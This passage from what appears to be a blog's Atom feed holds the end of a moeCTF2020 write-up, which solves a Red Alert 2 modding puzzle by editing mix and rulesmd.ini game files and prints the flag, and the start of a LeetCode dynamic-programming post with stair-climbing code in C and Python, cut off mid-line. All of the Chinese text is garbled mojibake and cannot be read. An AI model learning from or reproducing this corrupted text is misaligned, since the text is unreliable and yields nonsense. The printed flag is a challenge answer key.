å¯†æ–¹å¼å¦‚ä½•ï¼Œæ•…å…ˆè€ƒè™‘ä»å…¶ä»–å¯ä»¥æ‰“å¼€çš„mixæ–‡ä»¶ä¸­å¯»æ‰¾æœ‰ç”¨çš„ä¿¡æ¯</p><p>åœ¨<code>expandmd94.mix</code>æ–‡ä»¶ä¸­æˆ‘ä»¬å¯ä»¥å‘ç°è¿™æ ·ä¸€ä¸ªåå­—å¯ç–‘çš„æ–‡ä»¶ï¼š<code>winhex.shp</code>ï¼Œä½¿ç”¨xcc mixeræå–å‡ºæ¥</p><p><img src="https://i.loli.net/2020/10/08/eiczTy3HB5pDmNZ.png" alt="image.png"></p><p>è¿˜æ˜¯ç™¾åº¦ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™ç§æ–‡ä»¶éœ€è¦ä½¿ç”¨<code>shp builder</code>æ‰“å¼€</p><p><img src="https://i.loli.net/2020/10/08/g7BfXK5VFrsjPJ8.png" alt="image.png"></p><blockquote><h3 id="hint-1"><a href="#hint-1" class="headerlink" title="hint-1"></a>hint-1</h3><p>hint1æç¤ºï¼š</p><p><img src="https://i.loli.net/2020/10/08/LCmrMvXi4176Ka8.png" alt="image.png"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç½‘ç›˜çš„åå­—ä¸º<code>arttnba3çš„æ°¸ç¡•ç½‘ç›˜</code>ï¼Œä½†æ˜¯é“¾æ¥å´æ˜¯<a href="http://kiriko.ys168.com/">http://kiriko.ys168.com</a></p><p><img src="https://i.loli.net/2020/10/08/uso4xVS6PBq3eKF.png" alt="image.png"></p><p><code>arttnba3</code>ä½œä¸ºä¸€ä¸ªæ¯”è¾ƒç‹¬ç‰¹çš„å­—ç¬¦ä¸²ï¼Œä¸€èˆ¬æ¥è¯´ä¸ä¼šé‡åï¼Œä½†æ˜¯ç½‘ç›˜é“¾æ¥ä¸Šå´æ˜¯<code>kiriko</code>è€Œä¸æ˜¯<code>arttnba3</code></p><p>æ•…æˆ‘ä»¬è€ƒè™‘å°†é“¾æ¥æ”¹ä¸º<a href="http://arttnba3.ys168.com/">http://arttnba3.ys168.com</a></p><p>è¿›å…¥è¯¥ç½‘ç›˜å³å¯å¾—åˆ°ä¸€å¥—çº¢è­¦ä¿®æ”¹å¸¸ç”¨å·¥å…·ï¼Œå…¶ä¸­å°±åŒ…æ‹¬<code>SHP BUILDER</code></p><p><img src="https://i.loli.net/2020/10/08/WlUKzNnR56c29mA.png" alt="image.png"></p></blockquote><p>è½¯ä»¶<code>shp builder</code>å‘Šè¯‰æˆ‘ä»¬è¿™ä¸ªshpæ–‡ä»¶ä¸€å…±æœ‰114å¸§ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°å…¶ä¸­å¤§éƒ¨åˆ†éƒ½æ˜¯çº¯è‰²å¸§ï¼Œè€ƒè™‘ç¥å¿…æ•°å­—<code>114514</code>ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç¬¬51å¸§å‘ç°ä¸ä¸€æ ·çš„ä¸œè¥¿ï¼Œä½†æ˜¯é¢œè‰²å¾ˆæ˜æ˜¾ä¸å¯¹åŠ²</p><p><img src="https://i.loli.net/2020/10/08/naN1Du27iyLxdrU.png" alt="image.png"></p><p>è€ç™¾åº¦äººå¯ä»¥çŸ¥é“ä¸€ä¸ªå«åš<code>è°ƒè‰²æ¿</code>çš„ä¸œè¥¿</p><p><img src="https://i.loli.net/2020/10/08/l13R46VYfx9eb5a.png" alt="image.png"></p><p>ä½¿ç”¨ç¿»è¯‘è½¯ä»¶æˆ‘ä»¬å¯ä»¥çŸ¥é“<code>è°ƒè‰²æ¿</code>çš„è‹±æ–‡æ˜¯<code>palette</code>ï¼Œå¯¹åº”çš„åœ¨<code>shp builder</code>ä¸Šæ–¹æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°ä¸€ä¸ª<code>palette</code>æŒ‰é’®</p><p><img src="https://i.loli.net/2020/10/08/KwufTlbtM7A3r4U.png" alt="image.png"></p><p>ç‚¹å‡»é€‰æ‹©<code>Red Alert 2</code>ä¸€æ çš„ç¬¬ä¸€ä¸ª<code>anim.pal</code>ï¼Œæˆ‘ä»¬å‘ç°å›¾ç‰‡å˜å¾—æ­£å¸¸äº†èµ·æ¥</p><p><img src="https://i.loli.net/2020/10/08/rp3luSN52OCIAos.png" alt="image.png"></p><p>ä½¿ç”¨<code>winhex</code>æ‰“å¼€è¢«åŠ å¯†çš„å‡ ä¸ªmixæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°<code>expandmd98.mix</code>æ–‡ä»¶çš„æœ«å°¾offsetåˆšå¥½ä¹Ÿåœ¨<code>00530F20</code>é™„è¿‘ï¼Œä¸åŒçš„æ˜¯æ¯”<code>winhex.shp</code>ä¸­å¤šäº†ä¸€æ®µ</p><p>æˆ‘ä»¬å°è¯•å°†è¿™ä¸€æ®µå¤šå‡ºæ¥çš„æ•°æ®åˆ æ‰åå‘ç°è¯¥æ–‡ä»¶ä¾¿å¯ä»¥ä½¿ç”¨xcc mixeræ‰“å¼€äº†ï¼ŒåŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°<code>rulesmd.ini</code>æ–‡ä»¶å°±åœ¨é‡Œé¢</p><p><img src="https://i.loli.net/2020/10/08/bX3z5lheLdYI79a.png" alt="image.png"></p><blockquote><h3 id="hint-2"><a href="#hint-2" class="headerlink" title="hint - 2"></a>hint - 2</h3><p>hint2æç¤ºäº†æˆ‘ä»¬é€‰æ‹©ç›¸åº”çš„è°ƒè‰²ç›˜ä»¥åŠå¯¹æ¯”mixæ–‡ä»¶å°¾æ•°æ®æ‰¾å‡ºæ­£ç¡®çš„mixæ–‡ä»¶</p><p><img src="https://i.loli.net/2020/10/08/RYecQ3KJW7rbkjZ.png" alt="image.png"></p></blockquote><p>ä½¿ç”¨xcc mixeræå–å‡ºæ¥ï¼Œæˆ‘ä»¬åªéœ€è¦æ”¹å‡ºã€å¤©æ°”æ§åˆ¶ä»ªã€‘æˆ–è®¸å°±èƒ½å¾—åˆ°flag</p><p>ä¸ä¼šä¿®æ”¹ä¹Ÿæ²¡å…³ç³»ï¼Œé—ªç”µé£æš´ç›´è¯‘æ˜¯ã€lightningstromã€‘ï¼Œæœç´¢å³å¯æ‰¾åˆ°å¤©æ°”æ§åˆ¶ä»ªã€weather control deviceã€‘çš„ä»£ç </p><p><img src="https://i.loli.net/2020/10/08/2sbVG16BrkJEOM8.png" alt="image.png"></p><p>å…¶ä¸­çš„å‚æ•°éƒ½æ˜¯æ¯”è¾ƒç®€å•æ˜“è¯»çš„ï¼š</p><ul><li>Costï¼šå¾ˆæ˜æ˜¾æ˜¯ä»·æ ¼ï¼Œæ”¹ä¸€ä¸ªä½ä¸€ç‚¹çš„å³å¯</li><li>RequiredHousesï¼šåé¢è·Ÿç€ä¸€ä¸ª<code>China</code>æç¤ºæˆ‘ä»¬è¿™åº”å½“æŒ‡çš„æ˜¯éœ€æ±‚çš„å›½å®¶ï¼Œä¹Ÿå°±æ˜¯åªæœ‰è¿™ä¸ªå›½å®¶èƒ½å¤Ÿè¿›è¡Œå»ºé€ çš„æ„æ€ï¼Œæ”¹ä¸ºä»»ä¸€ç›Ÿå†›é˜µè¥å›½å®¶åå³å¯ï¼Œå¯ä»¥å‚ç…§ä¸Šæ–¹çš„<code>Owner</code>è¯­å¥å¾—åˆ°å›½å®¶åï¼›å½“ç„¶ï¼Œå¦‚æœæ˜¯æ¯”è¾ƒç†Ÿæ‚‰çº¢è­¦çš„å°ä¼™ä¼´åº”è¯¥çŸ¥é“è¿™ä¸ªè¯­å¥æ˜¯å¯ä»¥ç›´æ¥åˆ é™¤çš„</li><li>BuildLimitï¼šå»ºé€ é™åˆ¶ï¼Œæ¨æµ‹æ˜¯æ•°é‡é™åˆ¶ï¼Œ-1è‡ªç„¶æ— æ³•å»ºé€ ï¼Œéšä¾¿æ”¹ä¸€ä¸ªæ­£æ•°å³å¯</li><li>TechLevelï¼šç§‘æŠ€ç­‰çº§ï¼Œæˆ‘ä»¬åœ¨é­é‡æˆ˜é¡µé¢æ˜¯å¯ä»¥çœ‹åˆ°æœ‰ä¸ªè°ƒèŠ‚ç§‘æŠ€ç­‰çº§1è‡³10çš„é€‰é¡¹çš„ï¼Œè¿™é‡Œç­‰çº§ä¸º-1è‡ªç„¶æ— æ³•å»ºé€ ï¼Œæ”¹ä¸º1è‡³10ä¸­ä»»ä¸€æ•´æ•°å³å¯</li></ul><p>æˆ‘ä»¬å¯ä»¥å‘ç°æ¸¸æˆä¸­æç¤ºæˆ‘ä»¬<strong>FLAGå†…å®¹åœ¨è¶…æ­¦é‡Œ</strong></p><p><img src="https://i.loli.net/2020/10/08/Ud17cPvarkSs2my.png" alt="image.png"></p><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬ä»…æ”¹æ‰è¿™äº›é™åˆ¶æ¡ä»¶ï¼Œæˆ‘ä»¬ä¼šå‘ç°å‡ºæ¥çš„å¹¶ä¸æ˜¯æ­£ç¡®çš„flagï¼ˆth1s_1s_f4ke_fla9!ğŸ‘‰this is fake flagï¼‰</p><p><img src="https://i.loli.net/2020/10/08/8rR1fjKBd2xhqQL.png" alt="image.png"></p><p>è€ƒè™‘åˆ°é¢˜ç›®ä¸­æœ‰å†™é“<strong>ã€æ·»åŠ äº†ä¸€ä¸ªçœŸÂ·é—ªç”µé£æš´ã€‘</strong>ï¼Œæ•…æˆ‘ä»¬å¯ä»¥çŸ¥é“flagåº”è¯¥ä¸æ˜¯è—åœ¨åŸè¶…çº§æ­¦å™¨ä¸­</p><p><img src="https://i.loli.net/2020/10/08/DTwjCNSy5Fq6ga2.png" alt="image.png"></p><p>æˆ‘ä»¬é‡æ–°å›åˆ°<code>rulesmd.ini</code>ï¼Œå¯ä»¥å‘ç°å¦‚ä¸‹è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SuperWeapon=LightningStormSpecial</span><br></pre></td></tr></table></figure><p>çœ‹åå­—åº”è¯¥æ˜¯è¶…çº§æ­¦å™¨çš„æ„æ€ï¼Œiniä¸­æœç´¢<code>LightningStormSpecial</code>æˆ‘ä»¬å¯ä»¥å‘ç°ä¸€ä¸ªç±»ä¼¼æ³¨å†Œåå•çš„ä¸œè¥¿ï¼Œå…¶ä¸­æœ€æ–°çš„ä¸€ä¸ªä¸º<code>UltimateSpecial</code></p><p><img src="C:\Users\SUR\AppData\Roaming\Typora\typora-user-images\1602093565355.png" alt="1602093565355"></p><p>å°†å¤©æ°”æ§åˆ¶ä»ªä»£ç ä¸­è¯­å¥<code>SuperWeapon=</code>åé¢çš„<code>LightningStormSpecial</code>æ›¿æ¢ä¸º<code>UltimateSpecial</code>ï¼Œé‡æ–°å°è¯•è¿è¡Œæ¸¸æˆï¼Œå»ºé€ å¤©æ°”æ§åˆ¶ä»ªï¼Œå¾—åˆ°flag</p><p>![B_T74BXSD&#96;<a href="mailto:&#50;&#x40;&#95;&#89;&#x5f;&#76;&#77;&#x45;&#x5a;&#95;&#x42;&#65;&#68;&#46;&#112;&#x6e;&#103;">&#50;&#x40;&#95;&#89;&#x5f;&#76;&#77;&#x45;&#x5a;&#95;&#x42;&#65;&#68;&#46;&#112;&#x6e;&#103;</a>](<a href="https://i.loli.net/2020/10/08/sGNzKtdwMIq8FyE.png">https://i.loli.net/2020/10/08/sGNzKtdwMIq8FyE.png</a>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;enj0y_th3_p0w3r_0f_lig6tn1n9_st0rm!&#125;</span><br></pre></td></tr></table></figure><blockquote><h3 id="hint-3"><a href="#hint-3" class="headerlink" title="hint - 3"></a>hint - 3</h3><p>hint3å‘Šè¯‰æˆ‘ä»¬iniä¿®æ”¹æ—¶éœ€è¦æ³¨æ„é™åˆ¶æ¡ä»¶ï¼Œå¹¶æç¤ºæˆ‘ä»¬çœŸÂ·é—ªç”µé£æš´åº”å½“åœ¨æ–°å¢æ³¨å†Œåè¡¨é‡Œæœ‰</p><p><img src="https://i.loli.net/2020/10/08/KR2VgHfd5cezaAF.png" alt="image.png"></p></blockquote><blockquote><h3 id="hint-4"><a href="#hint-4" class="headerlink" title="hint - 4"></a>hint - 4</h3><p>hint4å‘Šè¯‰æˆ‘ä»¬åœ¨csfä¸­ç¢°è¿æ°”</p><p><img src="https://i.loli.net/2020/10/08/S3j5dG2kierolQI.png" alt="image.png"></p><p>åœ¨å…ˆå‰æˆ‘ä»¬è§£å¯†çš„mixæ–‡ä»¶ä¸­ç¡®å®å­˜åœ¨ä¸€ä¸ªåç¼€åä¸º<code>*.csf</code>çš„æ–‡ä»¶</p><p><img src="https://i.loli.net/2020/10/08/FG39pIlXquEgjDS.png" alt="image.png"></p><p>hint1ç»™å‡ºçš„å·¥å…·åŒ…åŒ…å«ä¸€ä¸ªCSFEditorï¼Œä»åå­—ä¸Šå°±å¯ä»¥çŸ¥é“æ˜¯ç”¨æ¥ç¼–è¾‘csfæ–‡ä»¶çš„</p><p>æ‰“å¼€åæˆ‘ä»¬å¯ä»¥åœ¨<code>NAME</code>å­—æ®µå‘ç°flag</p><p><img src="https://i.loli.net/2020/10/08/bj8o5W4wCuvze1Q.png" alt="image.png"></p></blockquote><blockquote><h3 id="EXTRA-å¿«æ·è§£æ³•"><a href="#EXTRA-å¿«æ·è§£æ³•" class="headerlink" title="EXTRA:å¿«æ·è§£æ³•"></a>EXTRA:å¿«æ·è§£æ³•</h3><p>æˆ‘ä»¬åœ¨ä½¿ç”¨winhexæŸ¥çœ‹<code>expandmd98.mix</code>æ—¶å¯ä»¥å‘ç°å¯ä»¥å­—ç¬¦ä¸²<code>Name:UltimateStorm</code>ï¼ŒçŒœæµ‹ä¸ºã€çœŸÂ·é—ªç”µé£æš´ã€‘çš„UIName</p><p><img src="https://i.loli.net/2020/10/08/yfndjKzWN6hrUCZ.png" alt="image.png"></p><p>ä¸‹è½½ä¸€ä¸ªåŸç‰ˆrulesmd.iniï¼Œéšä¾¿æ›´æ”¹ä¸€ä¸ªå•ä½çš„<code>UIName</code>å­—æ®µä¸º<code>Name:UltimateStorm</code>ï¼Œå†é€ å‡ºæ¥ä¹Ÿå¯ä»¥å¾—åˆ°flag</p><p>è¿™é‡Œæˆ‘ä»¬é€‰æ‹©ç›Ÿå†›åŸºåœ°è½¦</p><p><img src="https://i.loli.net/2020/10/08/2cbvVt1i3ZRF5DW.png" alt="image.png"></p><p>ä¸€è¿›å…¥æ¸¸æˆä¾¿å¯ä»¥å¾—åˆ°flag</p><p><img src="https://i.loli.net/2020/10/08/oXghLYjH6aG1n49.png" alt="image.png"></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-ç»ªè®º&quot;&gt;&lt;a href=&quot;#0x00-ç»ªè®º&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç»ªè®º&quot;&gt;&lt;/a&gt;0x00.ç»ªè®º&lt;/h1&gt;&lt;p&gt;å¾ˆè£å¹¸èƒ½å’ŒRXå¤§å“¥ä»¥åŠè¯¸ä½å¸¦å¸ˆå‚…å…±åŒå‡ºäº†moeCTF2020çš„é¢˜ç›®ï¼Œä¹Ÿå¸Œæœ›åšé¢˜çš„å„ä½èƒ½å¤Ÿè·å¾—å¿«ä¹XD&lt;/p&gt;
&lt;p&gt;é—²è¯ä¸å¤šè¯´ï¼Œç‚¹å¼€å³å¯æŸ¥çœ‹é¢˜è§£ğŸ‘‡&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æ³¨ï¼šåŸé¢˜çš†å¯åœ¨æœ¬é¡µé¢ç›´æ¥ä¸‹è½½&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="ret2text" scheme="http://archive.next.arttnba3.cn/tags/ret2text/"/>
    
    <category term="python" scheme="http://archive.next.arttnba3.cn/tags/python/"/>
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://archive.next.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="PWN" scheme="http://archive.next.arttnba3.cn/tags/PWN/"/>
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/tags/CTF/"/>
    
    <category term="ret2shellcode" scheme="http://archive.next.arttnba3.cn/tags/ret2shellcode/"/>
    
    <category term="ROP" scheme="http://archive.next.arttnba3.cn/tags/ROP/"/>
    
    <category term="Alphanumeric Shellcode" scheme="http://archive.next.arttnba3.cn/tags/Alphanumeric-Shellcode/"/>
    
    <category term="æ ˆè¿ç§»" scheme="http://archive.next.arttnba3.cn/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    
    <category term="UAF" scheme="http://archive.next.arttnba3.cn/tags/UAF/"/>
    
    <category term="ret2libc" scheme="http://archive.next.arttnba3.cn/tags/ret2libc/"/>
    
    <category term="canary" scheme="http://archive.next.arttnba3.cn/tags/canary/"/>
    
  </entry>
  
  <entry>
    <title>ã€OJ-0x0003-Leetcodeã€‘åŠ¨æ€è§„åˆ’éƒ¨åˆ†write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/09/06/%E3%80%90OJ-0x0003-Leetcode%E3%80%91%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E9%83%A8%E5%88%86write-up-by-arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/09/06/%E3%80%90OJ-0x0003-Leetcode%E3%80%91%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E9%83%A8%E5%88%86write-up-by-arttnba3/</id>
    <published>2020-09-06T08:21:11.000Z</published>
    <updated>2020-11-20T06:07:36.764Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-ç»ªè®º"><a href="#0x00-ç»ªè®º" class="headerlink" title="0x00.ç»ªè®º"></a>0x00.ç»ªè®º</h1><p><strong>åŠ¨æ€è§„åˆ’</strong>ï¼ˆ<strong>Dynamic Programming</strong>ï¼‰æ˜¯ä¸€ç§é€šè¿‡æŠŠåŸé—®é¢˜åˆ†è§£ä¸ºç›¸å¯¹ç®€å•çš„å­é—®é¢˜çš„æ–¹å¼æ±‚è§£å¤æ‚é—®é¢˜çš„æ–¹æ³•ã€‚åŒæ—¶ä¹Ÿæ˜¯å„ç±»ä¿¡æ¯å­¦ç«èµ›ï¼ˆ Olympiad in Informatics ï¼‰ä¸­è¾ƒä¸ºå¸¸ç”¨çš„ç®—æ³•ä¹‹ä¸€ã€‚</p><p>ä½œä¸ºå‰Â·è’Ÿè’»Â·OIerï¼Œå¯¹åŠ¨æ€è§„åˆ’ä¹Ÿæ˜¯ç¨å¾®äº†è§£ä¸€ç‚¹ç‚¹çš„XDï¼Œæ‰€ä»¥ç°åœ¨æ¥ç®€å•åˆ·ä¸€åˆ·leetcodeä¸ŠåŠ¨æ€è§„åˆ’çš„é¢˜Or2</p><blockquote><p>æœ€åæ›´æ–°æ—¥æœŸ2020.9.7</p></blockquote><span id="more"></span><h2 id="pre-ä»€ä¹ˆæ˜¯åŠ¨æ€è§„åˆ’ç®—æ³•ï¼Ÿ"><a href="#pre-ä»€ä¹ˆæ˜¯åŠ¨æ€è§„åˆ’ç®—æ³•ï¼Ÿ" class="headerlink" title="pre.ä»€ä¹ˆæ˜¯åŠ¨æ€è§„åˆ’ç®—æ³•ï¼Ÿ"></a>pre.ä»€ä¹ˆæ˜¯åŠ¨æ€è§„åˆ’ç®—æ³•ï¼Ÿ</h2><p>ç®€å•è€Œè¨€ï¼š</p><p>åŠ¨æ€è§„åˆ’ä¾¿æ˜¯é€šè¿‡å¯»æ‰¾å‡ºä¸€ä¸ªé—®é¢˜çš„<strong>é‡å å­é—®é¢˜</strong>&#x2F;<strong>æœ€ä¼˜å­ç»“æ„</strong>æ¥ä¼˜åŒ–å¯¹é—®é¢˜çš„æ±‚è§£ï¼Œå°†é—®é¢˜è¿›è¡Œåˆ†é˜¶æ®µæ±‚è§£ï¼Œå¹¶ç¡®ä¿å½“å‰é˜¶æ®µæ˜¯è¿‡äºæ‰€æœ‰é˜¶æ®µçš„å®Œç¾æ€»ç»“ã€‚</p><p>å…·ä½“çš„<strong>å¯ä»¥çœ‹çœ‹æˆ‘ä¹‹å‰å†™çš„</strong><a href="https://archive.next.arttnba3.cn/2020/04/21/[%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-0x01]%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90by-arttnba3/">åšæ–‡</a></p><h1 id="0x01-éš¾åº¦ï¼šç®€å•"><a href="#0x01-éš¾åº¦ï¼šç®€å•" class="headerlink" title="0x01.éš¾åº¦ï¼šç®€å•"></a>0x01.éš¾åº¦ï¼šç®€å•</h1><h2 id="0x00-çˆ¬æ¥¼æ¢¯"><a href="#0x00-çˆ¬æ¥¼æ¢¯" class="headerlink" title="0x00.çˆ¬æ¥¼æ¢¯"></a>0x00.<a href="https://leetcode-cn.com/problems/climbing-stairs/">çˆ¬æ¥¼æ¢¯</a></h2><blockquote><p>å‡è®¾ä½ æ­£åœ¨çˆ¬æ¥¼æ¢¯ã€‚éœ€è¦ n é˜¶ä½ æ‰èƒ½åˆ°è¾¾æ¥¼é¡¶ã€‚</p><p>æ¯æ¬¡ä½ å¯ä»¥çˆ¬ 1 æˆ– 2 ä¸ªå°é˜¶ã€‚ä½ æœ‰å¤šå°‘ç§ä¸åŒçš„æ–¹æ³•å¯ä»¥çˆ¬åˆ°æ¥¼é¡¶å‘¢ï¼Ÿ</p><p>æ³¨æ„ï¼šç»™å®š n æ˜¯ä¸€ä¸ªæ­£æ•´æ•°ã€‚</p><p>ç¤ºä¾‹ 1ï¼š</p><p>è¾“å…¥ï¼š 2<br>è¾“å‡ºï¼š 2<br>è§£é‡Šï¼š æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥çˆ¬åˆ°æ¥¼é¡¶ã€‚</p><ol><li>1 é˜¶ + 1 é˜¶</li><li>2 é˜¶<br>ç¤ºä¾‹ 2ï¼š</li></ol><p>è¾“å…¥ï¼š 3<br>è¾“å‡ºï¼š 3<br>è§£é‡Šï¼š æœ‰ä¸‰ç§æ–¹æ³•å¯ä»¥çˆ¬åˆ°æ¥¼é¡¶ã€‚</p><ol><li>1 é˜¶ + 1 é˜¶ + 1 é˜¶</li><li>1 é˜¶ + 2 é˜¶</li><li>2 é˜¶ + 1 é˜¶</li></ol><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/climbing-stairs">https://leetcode-cn.com/problems/climbing-stairs</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><h3 id="é—®é¢˜åˆ†æ"><a href="#é—®é¢˜åˆ†æ" class="headerlink" title="é—®é¢˜åˆ†æ"></a>é—®é¢˜åˆ†æ</h3><p>ç®€å•åˆ†æï¼š</p><ul><li><p>ä¸Š0çº§æ¥¼æ¢¯ï¼šæœ‰0ç§èµ°æ³•</p></li><li><p>ä¸Š1çº§æ¥¼æ¢¯ï¼šæœ‰1ç§èµ°æ³•ï¼šç›´æ¥è·¨ä¸€é˜¶æ¥¼æ¢¯</p></li><li><p>ä¸Š2çº§æ¥¼æ¢¯ï¼šæœ‰2ç§èµ°æ³•ï¼šâ‘ å…ˆè·¨ä¸€é˜¶å†è·¨ä¸€é˜¶ï¼›â‘¡ç›´æ¥è·¨ä¸¤é˜¶æ¥¼æ¢¯</p></li><li><p>â€¦â€¦</p></li><li><p><strong>ä¸ŠNé˜¶æ¥¼æ¢¯</strong>ï¼š<strong>â‘ å…ˆèµ°åˆ°ç¬¬N-1é˜¶ï¼Œå†è·¨ä¸€é˜¶æ¥¼æ¢¯â‘¡å…ˆèµ°åˆ°N-2é˜¶ï¼Œå†ä¸€æ­¥è·¨ä¸¤é˜¶æ¥¼æ¢¯</strong>ï¼šä¸€å…±æ˜¯<strong>F(N-1)+F(N-2)ç§èµ°æ³•</strong></p></li></ul><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬èµ°nçº§æ¥¼æ¢¯çš„èµ°æ³•æ•°é‡éƒ½å¯ä»¥åŒ–ä¸º<strong>â‘ å…ˆèµ°åˆ°ç¬¬N-1é˜¶ï¼Œå†è·¨ä¸€é˜¶æ¥¼æ¢¯â‘¡å…ˆèµ°åˆ°N-2é˜¶ï¼Œå†ä¸€æ­¥è·¨ä¸¤é˜¶æ¥¼æ¢¯</strong>çš„èµ°æ³•</p><h4 id="çŠ¶æ€è½¬ç§»æ–¹ç¨‹"><a href="#çŠ¶æ€è½¬ç§»æ–¹ç¨‹" class="headerlink" title="çŠ¶æ€è½¬ç§»æ–¹ç¨‹"></a>çŠ¶æ€è½¬ç§»æ–¹ç¨‹</h4><p><strong>F(N) &#x3D; F(N-1) + F(N-2)</strong></p><p>æœ‰äº†è¿™ä¸ªæ–¹ç¨‹ä¹‹åï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“<strong>èµ°1çº§æ¥¼æ¢¯çš„èµ°æ³•æ•°é‡ä¸èµ°2çº§æ¥¼æ¢¯çš„èµ°æ³•æ•°é‡</strong>ï¼Œå°±å¯ä»¥é¡ºåˆ©åœ°<strong>æ¨å‡ºèµ°ä»»æ„ä¸€çº§æ¥¼æ¢¯çš„èµ°æ³•æ•°é‡</strong></p><h4 id="æ—¶é—´å¤æ‚åº¦"><a href="#æ—¶é—´å¤æ‚åº¦" class="headerlink" title="æ—¶é—´å¤æ‚åº¦"></a>æ—¶é—´å¤æ‚åº¦</h4><p>éœ€è¦æ±‚è§£næ¬¡ï¼Œæ•…æ—¶é—´å¤æ‚åº¦ä¸ºçº¿æ€§æ—¶é—´å¤æ‚åº¦<strong>O(N)</strong></p><h4 id="ç©ºé—´å¤æ‚åº¦"><a href="#ç©ºé—´å¤æ‚åº¦" class="headerlink" title="ç©ºé—´å¤æ‚åº¦"></a>ç©ºé—´å¤æ‚åº¦</h4><p>å› ä¸ºæˆ‘ä»¬åªéœ€è¦ä½¿ç”¨ä¸‰ä¸ªå˜é‡è¿­ä»£æ±‚è§£ï¼Œæ•…ç©ºé—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>1</strong>)</p><h3 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h3><h4 id="Cè¯­è¨€ç‰ˆï¼š"><a href="#Cè¯­è¨€ç‰ˆï¼š" class="headerlink" title="Cè¯­è¨€ç‰ˆï¼š"></a>Cè¯­è¨€ç‰ˆï¼š</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">climbStairs</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">2</span>, temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = a;</span><br><span class="line">        a = b;</span><br><span class="line">        b += temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/22/7bw2LteuRUhadgl.png" alt="image.png"></p><h4 id="Pythonè¯­è¨€ç‰ˆï¼š"><a href="#Pythonè¯­è¨€ç‰ˆï¼š" class="headerlink" title="Pythonè¯­è¨€ç‰ˆï¼š"></a>Pythonè¯­è¨€ç‰ˆï¼š</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">climbStairs</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        a, b = <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span 